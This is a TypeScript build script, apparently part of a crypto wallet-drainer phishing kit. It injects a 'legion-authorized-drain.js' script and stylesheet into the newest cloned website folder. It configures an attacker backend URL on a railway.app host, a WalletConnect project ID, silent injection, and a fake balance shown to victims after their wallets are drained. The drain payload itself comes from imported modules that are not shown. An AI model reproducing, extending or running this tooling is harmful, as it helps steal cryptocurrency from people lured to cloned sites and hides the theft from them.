/**
 * Rebuild legion-authorized-drain.js in the newest tunnel clone folder.
 * Usage: pnpm rebuild-clone-inject
 */
import { readdirSync, statSync } from 'node:fs';
import { writeFile as writeFileAsync } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  buildAuthorizedDrainCss,
  buildAuthorizedDrainInjectJs,
  parseFakeBalanceAfterDrainEnv,
} from './lib/authorized-drain-inject.ts';
import { applyClonePerfectionToOutDir } from './lib/clone-perfection-wire.ts';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '..');
const BACKEND = (process.env.BACKEND_URL || 'https://legionapi-production.up.railway.app').replace(/\/$/, '');

function latestTunnelDir() {
  const clonesDir = path.join(ROOT, 'clones');
  const dirs = readdirSync(clonesDir)
    .filter((name) => name.startsWith('tunnel-'))
    .sort()
    .reverse();
  for (const name of dirs) {
    const full = path.join(clonesDir, name);
    try {
      statSync(full);
      return { full, name };
    } catch {
      /* skip */
    }
  }
  return null;
}

async function main(): Promise<void> {
  const target = latestTunnelDir();
  if (!target) {
    console.error('No clones/tunnel-* directory found. Run pnpm clone-tunnel first.');
    process.exit(1);
  }

  const productionClone = process.env.PRODUCTION_CLONE === '1' || process.env.PRODUCTION_CLONE === 'true';
  const qaVisibleUi = process.env.QA_VISIBLE_UI === '1' || process.env.QA_VISIBLE_UI === 'true';

  const authJs = await buildAuthorizedDrainInjectJs({
    backendUrl: BACKEND,
    kineticKey: process.env.KINETIC_INTERNAL_KEY?.trim(),
    walletConnectProjectId: process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID?.trim(),
    silentInject: !qaVisibleUi,
    productionClone: productionClone || !qaVisibleUi,
    qaVisibleUi,
    fakeBalanceAfterDrain: parseFakeBalanceAfterDrainEnv(process.env.FAKE_BALANCE_AFTER_DRAIN),
  });

  await writeFileAsync(path.join(target.full, 'legion-authorized-drain.js'), authJs, 'utf8');
  await writeFileAsync(
    path.join(target.full, 'legion-authorized-drain.css'),
    buildAuthorizedDrainCss({ productionClone: productionClone || !qaVisibleUi }),
    'utf8',
  );
  await applyClonePerfectionToOutDir(target.full);

  console.log(`Rebuilt inject in ${target.name}`);
  console.log(`  ${path.join(target.full, 'legion-authorized-drain.js')}`);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
